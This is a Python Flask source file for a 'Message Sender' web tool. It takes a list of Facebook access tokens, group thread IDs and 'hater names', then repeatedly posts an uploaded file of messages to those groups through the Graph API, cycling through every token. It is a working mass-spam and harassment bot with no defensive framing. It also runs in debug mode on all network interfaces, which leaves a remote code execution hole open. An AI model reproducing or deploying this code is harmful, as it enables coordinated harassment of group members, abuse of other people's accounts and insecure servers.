from flask import Flask, request, jsonify, render_template_string
from threading import Thread, Event
import requests
import random
import string
import logging

app = Flask(__name__)
app.debug = True

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Dictionary to hold stop events and threads
stop_events = {}
threads = {}

# Function to send messages
def send_messages(access_tokens, thread_ids, hatter_names, messages, task_id):
    logging.info(f"Task {task_id} started.")
    for thread_id in thread_ids:
        for hatter_name in hatter_names:
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                for message in messages:
                    personalized_message = f"{hatter_name}: {message}"
                    parameters = {'access_token': access_token, 'message': personalized_message}

                    # Check for stop event
                    if stop_events.get(task_id).is_set():
                        logging.info(f"Task {task_id} stopping.")
                        return

                    try:
                        response = requests.post(api_url, data=parameters, timeout=5)
                        if response.status_code == 200:
                            logging.info(f"Message sent successfully from token {access_token}: {personalized_message}")
                        else:
                            logging.warning(f"Message failed from token {access_token}: {personalized_message} (Status: {response.status_code})")
                    except requests.RequestException as e:
                        logging.error(f"Request failed for token {access_token}: {e}")

@app.route('/stop/<task_id>', methods=['POST'])
def stop_task(task_id):
    if task_id in stop_events:
        stop_events[task_id].set()  # Signal the thread to stop
        return jsonify({"status": "stopping", "task_id": task_id}), 200
    return jsonify({"status": "not found", "task_id": task_id}), 404

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = []
        
        if token_option == 'single':
            access_tokens.append(request.form.get('singleToken'))
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_ids = request.form.getlist('threadIds')
        hatter_names = request.form.getlist('hatters')
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Create a unique task ID
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        
        stop_events[task_id] = Event()  # Create a new stop event for this task
        thread = Thread(target=send_messages, args=(access_tokens, thread_ids, hatter_names, messages, task_id))
        threads[task_id] = thread
        thread.start()
        
        return f'Task started with ID: {task_id}'
    
    # Render the HTML page with the form
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Message Sender</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #333;
      color: white;
    }
    .container {
      max-width: 500px;
      padding: 20px;
      margin: auto;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
    }
    label { color: white; }
    .form-control {
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <form method="post" enctype="multipart/form-data">
      <h3>Send Messages</h3>
      <div id="tokenInputs">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div id="singleTokenInput" class="token-input">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div id="tokenFileInput" class="token-input" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>

      <h4>Group UIDs (Up to 10)</h4>
      <div id="uidInputs">
        <input type="text" class="form-control" name="threadIds" placeholder="Enter Group UID">
      </div>

      <h4>Hater Names (Up to 10)</h4>
      <div id="hatterInputs">
        <input type="text" class="form-control" name="hatters" placeholder="Enter Hater Name">
      </div>

      <h4>Messages File</h4>
      <input type="file" class="form-control" id="txtFile" name="txtFile" required>

      <button type="button" class="btn btn-secondary" onclick="addUidInput()">Add UID</button>
      <button type="button" class="btn btn-secondary" onclick="addHatterInput()">Add Hater Name</button>
      <button type="submit" class="btn btn-primary">Run</button>
    </form>
  </div>
  
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = tokenOption === 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = tokenOption === 'multiple' ? 'block' : 'none';
    }

    function addUidInput() {
      var uidInputs = document.getElementById('uidInputs');
      var newInput = document.createElement("input");
      newInput.type = "text";
      newInput.className = "form-control";
      newInput.name = "threadIds";
      newInput.placeholder = "Enter Group UID";
      uidInputs.appendChild(newInput);
    }

    function addHatterInput() {
      var hatterInputs = document.getElementById('hatterInputs');
      var newInput = document.createElement("input");
      newInput.type = "text";
      newInput.className = "form-control";
      newInput.name = "hatters";
      newInput.placeholder = "Enter Hater Name";
      hatterInputs.appendChild(newInput);
    }
  </script>
</body>
</html>
''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
